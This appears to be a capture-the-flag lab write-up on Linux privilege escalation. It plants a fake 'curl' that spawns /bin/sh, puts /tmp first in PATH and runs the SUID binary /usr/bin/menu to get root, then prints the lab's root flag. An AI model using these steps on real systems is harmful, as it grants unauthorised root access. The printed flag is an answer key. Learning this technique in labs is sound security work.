# Task 4 - Privilege Escalation (PATH Hijacking)

## 🎯 Objective
Escalate privileges to root using SUID binary abuse.

## 🔍 Find SUID Binaries

```bash
find / -perm -u=s -type f 2>/dev/null
```

## 📌 Suspicious Binary Found
- `/usr/bin/menu`

## ▶️ Run Binary

```bash
/usr/bin/menu
```

## 📊 Menu Options
- 3 options available

## 🔎 Analyze Binary

```bash
strings /usr/bin/menu
```

## 💣 Exploitation (PATH Hijack)

```bash
cd /tmp
echo /bin/sh > curl
chmod 777 curl
```

## ⚙️ Modify PATH

```bash
export PATH=/tmp:$PATH
```

## 🚀 Run Exploit

```bash
/usr/bin/menu
```

## 👑 Root Flag

```bash
cat /root/root.txt
```

## 📌 Result
- Root flag: **177b3cd8562289f37382721c28381f02**

## 🧠 Notes
- SUID binary executed system commands without absolute paths
- PATH manipulation allowed command hijacking
